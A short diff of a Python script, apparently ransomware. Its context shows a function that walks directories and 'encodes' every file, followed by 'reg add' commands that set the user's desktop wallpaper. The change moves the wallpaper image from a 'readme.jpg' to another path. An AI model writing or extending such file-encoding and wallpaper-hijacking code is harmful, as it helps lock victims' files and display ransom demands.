@@ -45,7 +45,7 @@ def Search(dirname):
                 Encoding(full_filename)
 
 desktopPath = os.path.expanduser('~')
-filepath = '"' + desktopPath + '\\desktop\\readme.jpg" /f'
+filepath = '"' + desktopPath + '\\desktop\\rdm\\837477.jpg" /f'
 reg_key_1 = 'reg add "hkcu\control panel\desktop" /v wallpaper /t REG_SZ /d ' + filepath
 reg_key_2 = 'reg add "hkcu\control panel\desktop" /v WallpaperStyle /t REG_SZ /d 0 /f'
 
